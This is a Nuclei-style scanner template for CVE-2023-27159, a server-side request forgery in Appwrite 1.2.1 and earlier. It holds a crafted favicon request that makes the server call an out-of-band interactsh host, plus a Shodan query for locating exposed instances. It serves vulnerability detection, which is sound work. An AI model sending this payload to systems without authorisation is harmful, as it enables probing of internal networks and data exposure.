id: CVE-2023-27159

info:
  name: Appwrite <= 1.2.1 - Server-Side Request Forgery
  author: DhiyaneshDk
  severity: medium
  description: |
    Appwrite up to v1.2.1 was discovered to contain a Server-Side Request Forgery (SSRF) via the component /v1/avatars/favicon. This vulnerability allows attackers to access network resources and sensitive information via a crafted GET request.
  reference:
    - https://gist.github.com/b33t1e/43b26c31e895baf7e7aea2dbf9743a9a
    - https://notes.sjtu.edu.cn/gMNlpByZSDiwrl9uZyHTKA
  classification:
    cve-id: CVE-2023-27159
  metadata:
    verified: "true"
    shodan-query: title:"Sign In - Appwrite"
  tags: cve,cve2023,appwrite,ssrf,oast

requests:
  - method: GET
    path:
      - "{{BaseURL}}/v1/avatars/favicon?url=http://{{interactsh-url}}"

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: word
        part: interactsh_request
        words:
          - "User-Agent: Appwrite-Server"
